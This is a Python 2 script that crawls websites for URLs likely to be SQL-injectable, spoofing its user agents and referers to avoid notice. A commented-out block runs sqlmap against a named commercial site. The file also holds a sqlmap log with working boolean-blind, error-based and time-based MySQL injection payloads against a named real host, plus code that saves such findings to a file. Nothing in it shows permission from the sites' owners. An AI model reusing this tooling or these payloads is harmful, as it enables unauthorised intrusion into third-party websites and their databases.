#coding:utf-8

import random
import re
import binascii
import requests
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

REFERERS = [
    "https://www.baidu.com",
    "http://www.baidu.com",
    "https://www.google.com.hk",
    "http://www.so.com",
    "http://www.sogou.com",
    "http://www.soso.com",
    "http://www.bing.com",
]

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

headers = {
    'User-Agent': random.choice(headerss),
    'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control': 'max-age=0',
    'referer': random.choice(REFERERS),
    'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
}



def get_links(url):
    '''
    需要的有常规的注入点
        1. category.php?id=17
        2. https://www.yamibuy.com/cn/brand.php?id=566
    伪静态
        1. info/1024/4857.htm
        2. http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
    :param url:
    :return:
    '''
    domain = url.split('//')[1].strip('/').replace('www.', '')
    result = []
    id_links = []
    html_links = []
    result_links = {}
    html_links_s = []
    idid=[]
    htht=[]
    try:
        headers = {
            'User-Agent': random.choice(headerss),
            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cache-Control': 'max-age=0',
            'referer': random.choice(REFERERS),
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        }
        rxww = requests.get(url, headers=headers, timeout=5).content
        soup = BeautifulSoup(rxww, 'html.parser')
        links = soup.findAll('a')
        for link in links:
            _url = link.get('href')
            res = re.search('(javascript|:;|#)', str(_url))
            res1 = re.search('.(jpg|png|bmp|mp3|wma|wmv|gz|zip|rar|iso|pdf|txt|db)', str(_url))
            if res == None and res1 == None:
                result.append(str(_url))
            else:
                pass
        if result != []:
            rst = list(set(result))
            for rurl in rst:
                if '//' in rurl and 'http' in rurl:
                    # https://www.yamibuy.com/cn/search.php?tags=163
                    # http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
                    if domain in rurl:
                        if '?' in rurl and '=' in rurl:
                            #result_links.append(rurl)
                            id_links.append(rurl)
                        if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                            if '?' not in rurl:
                            #result_links.append(rurl)
                                html_links.append(rurl)

                else:
                    # search.php?tags=163
                    if '?' in rurl and '=' in rurl:
                        #result_links.append(url + '/' + rurl)
                        id_links.append(url + '/' + rurl)
                    if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                        #result_links.append(url + '/' + rurl)
                        if '?' not in rurl:
                            html_links.append(url + '/' + rurl)


            for x1 in html_links:
                try:
                    rx1 = requests.head(url=x1,headers=headers,timeout=5).status_code
                    if rx1 == 200:
                        htht.append(x1)
                except:
                    pass
            for x2 in id_links:
                try:
                    rx2 = requests.head(url=x2,headers=headers,timeout=5).status_code
                    if rx2 == 200:
                        idid.append(x2)
                except:
                    pass


            if htht == []:
                pass
            else:
                for x in htht:
                    if x.count('/')>3:
                        ra = re.search('.*?/[0-9]\.',x)
                        if ra == None:
                            pass
                        else:
                            html_links_s.append(x)
                        if html_links_s == []:
                            html_links_s.append(random.choice(htht))

                if html_links_s == []:
                    result_links['html_links'] = random.choice(htht)
                else:
                    result_links['html_links'] = random.choice(html_links_s)


            if idid == []:
                pass
            else:
                result_links['id_links'] = random.choice(idid)
        if result_links == {}:
            return None
        else:
            return result_links
    except Exception,e:
        print e
    return None

import subprocess

# from urllib import quote
# cm = "sqlmap.py -u https://www.liepin.com/zhaopin/?d_sfrom=search_fp_nvbar^&init=1 --batch"
# print cm
# a = subprocess.Popen(cm,shell=True,stdout=subprocess.PIPE)
# print a.stdout.read()
#

url = '123.com'
result = '''


---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://steel.baidajob.com:80/article-569790 RLIKE (SELECT (CASE WHEN (6469=6469) THEN 0x61727469636c652d353639373930 ELSE 0x28 END)).html

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://steel.baidajob.com:80/article-569790 AND (SELECT 6938 FROM(SELECT COUNT(*),CONCAT(0x716b6a6b71,(SELECT (ELT(6938=6938,1))),0x7170766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a).html

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (comment)
    Payload: http://steel.baidajob.com:80/article-569790 AND SLEEP(5)#.html
---
[20:24:36] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.2.17
back-end DBMS: MySQL >= 5.0
[20:24:36] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 112 times, 404 (Not Found) - 91 times
[20:24:36] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\steel.baidajob.com'

[*] ending @ 20:24:36 /2018-11-17/

'''

def check(result,url):
    if '---' in result:
        result_info = re.search('---(.*?)---.*?INFO\] (.*?)\[',result,re.S)
        inj = result_info.group(1)
        dbs = result_info.group(2)
        with open('result.txt', 'a+') as a:
            a.write('Url:' + url + '\n')
            a.write(inj + '\n')
            a.write(dbs + '\n')
            a.write('----------------------' + '\n')
    else:
        return None


check(result,url)